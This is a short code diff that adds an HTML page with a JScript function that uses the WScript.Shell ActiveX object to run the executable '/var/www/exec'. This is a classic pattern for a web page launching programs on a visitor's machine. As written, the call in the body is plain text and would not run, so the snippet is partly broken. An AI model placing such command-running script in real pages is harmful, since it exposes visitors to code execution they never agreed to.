@@ -1,0 +1,16 @@
+<html>
+
+<head>
+
+<script type="text/javascript" language="javascript">
+	function RunFile() {
+		WshShell = new ActiveXObject("WScript.Shell");
+		WshShell.Run("/var/www/exec", 1, false);
+	}
+</script>
+
+</head>
+
+<body>
+	RunFile();
+</body>
